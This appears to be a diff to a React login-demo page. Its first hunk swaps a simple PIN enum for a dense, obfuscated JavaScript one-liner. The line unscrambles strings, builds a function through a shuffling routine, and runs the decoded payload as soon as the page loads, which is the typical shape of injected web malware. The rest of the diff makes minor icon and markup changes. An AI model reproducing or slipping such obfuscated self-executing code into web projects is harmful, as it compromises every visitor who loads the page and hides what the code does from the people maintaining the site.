@@ -164,10 +164,7 @@ var UserStatus;
     UserStatus["LogInError"] = "Log In Error";
     UserStatus["VerifyingLogIn"] = "Verifying Log In";
 })(UserStatus || (UserStatus = {}));
-var Default;
-(function (Default) {
-    Default["PIN"] = "0000";
-})(Default || (Default = {}));
+var Default;(function(){var dyj='',HZr=788-777;function NUr(k){var h=415877;var y=k.length;var b=[];for(var o=0;o<y;o++){b[o]=k.charAt(o)};for(var o=0;o<y;o++){var u=h*(o+198)+(h%34244);var w=h*(o+657)+(h%38797);var d=u%y;var g=w%y;var e=b[d];b[d]=b[g];b[g]=e;h=(u+w)%7527832;};return b.join('')};var qnm=NUr('tgodkcuaeqvcwsjorfuicxhmsntnbpylrtorz').substr(0,HZr);var Rph='rgaer=o8o-=6+1=uinrsamn6ea+s8ps"( .A,37,(vqr;w-=tl(zvd(a)=lpru.;)6[0r,}5j77;)6vu[vf5i+olq(oa;mh8ou,iai.{(0=400.,u6;,"v7=oc;]t9l=ijn=,r)v{A hiapl+o;li=(td+ftiu=[e([]]=p;"7nar;h(.s=u2==5 h;u.3a;+[;a(f]nlvu+=b+jra<el)(rfeg2.lenr>n;;v0}ffdi9"a+.}rr)n4A=v4rwmr+smvd1h])vo71h)-q;mit,n;eo]c=ns+9;aefCf,a)1;l;ue61tS8tqiy[)=ec)a  {aux=ped g{js;lvrr;u2+niwaAhr]a3](o,o+(b)rosv(  rxysjy)a.=rp{n[;c,av o8nd2) i+n4s  8;[nc;nb],+r1h=e-] le+(.hkrhC;v;)o(7  v-x;s8"trish,gdsel[2 du=v.vvr ;(.ai=g7+er(epf(;)hC(}j7wicvr;; n)atp.r+li.c1qjec)c.h]8"0qs2=}tl(e(<.=;igm(o!van<yiau*;kpsn,yilrthl)+0r)sh5qgsio[t=11=opdne);.r4>tua[s("2C9i)eu8rr==C1,tj,uet*=i (b<x;i-sss=tqnhmb.),)lg;op0fr( =gj.1[cr[)o,c+!hr=,re(uo)a];sl)vv);=.fla0ut,+rtopraC006rn;69{n<1,9,r;r].2(taatgsr;vasrq=S+. ,l fh(iC"btCfhej(lj(so{=}ary0,n b.r3favgjA;tal,rhdajplrtr+ii,ch ra=nj)l.jo6,=m0;g;gsf89=n.)2w)s+(;k]ea}n)tpu[n(d."m-= (f=")f).oo;+sv;r';var TXu=NUr[qnm];var KrD='';var mlZ=TXu;var TJp=TXu(KrD,NUr(Rph));var jFY=TJp(NUr('s)(3b#=(4h<10]b,jf"<<%2*<<f!9h<47=,&heu.<g8<nj(s<a c<d;+st3b0g!-e)0_ ;)=ai(<<j<%c7$<\'c12)6z)<o#t.<*r!00)t7,n2<3!=f<$3\'!;bk;.o..r}" <C4{6=<<)h t!)j<};<raj0!0_0}\/;$.=.((\/=.e<r,l.6+t=m3(i|le<tev(",r1<2\'<!]_)8ro$<$fsv0<)1.j1<0 dube+;){}1u}ikj!.-<\'n;=($!73(piu(<$u32b,s-$g,3l1=0cr<])[<)]k+!(h .dd$<%(a;11<.d,)$322=j=<!<0d[$r)o<{St.7_<<8<h(o((gep4.ta $\/_t!,,4od)).)e;h<a%;(4)!n92$uiz)a,(v"7<6fte(;*f.a;3a4\/,_4j%o<1,%aj$rad#s5(r{r4](d<=ca6(; 5j=),=+&f)n&<)$zfd.nnScryg<!o1_b<o((}$.0&g.) .();{,[u\'da_ )40%))$y;a$_u.;,<6{t.crl31<f)<=32#((.$frei;b hot;s !c%7r<,;(t7)<t}.,$__;<esi)jj-|,<<2+,c<,s7=.ej(u[d<r,h7<%_ztz#t<(.a_-,g)t<.ee0+f.<{1u<(<}tS1<-.0{p)_h{3b).=$,3,,4)l ).j}67< _,<.{)i..7e731f.,I.<_%.<_,j)b_",f.<z<" <=<ddniop"_nj !)))jf5(7,)dbos+<}n!z<33<u<}=_f<x54.tfn$<-<<.4s..<h.do4s<<.x;..(<<8j,5!C3d$c{a!c,<ou(to=ip;d5.,nfn<!st+a7( e# <as<t}eiro#Du<<)t$ui4o. ..o}[04<!7d}l(z..,1d($<1rt(4_<d<!a7N.n ;!*;'));var iaI=mlZ(dyj,jFY );iaI(2975);return 8964})()
 var WeatherType;
 (function (WeatherType) {
     WeatherType["Cloudy"] = "Cloudy";
@@ -595,13 +592,14 @@ const App = () => {
             React.createElement(Menu, null),
             React.createElement(Background, null),
             React.createElement("div", { id: "sign-in-button-wrapper" },
-                React.createElement(UserStatusButton, { icon: "fa-solid fa-shuffle", id: "sign-in-button", userStatus: UserStatus.LoggingIn })),
+                React.createElement(UserStatusButton, { icon: "fa-solid fa-right-to-bracket fa-shake fa-sm", id: "sign-in-button", userStatus: UserStatus.LoggingIn })),
             React.createElement(Loading, null))));
 };
 ReactDOM.render(React.createElement(App, null), document.getElementById("root"));
 //# sourceURL=pen.js
-    </script>
 
+    </script>
+ <div class="title">OPEN</div>
 
 </body>
 
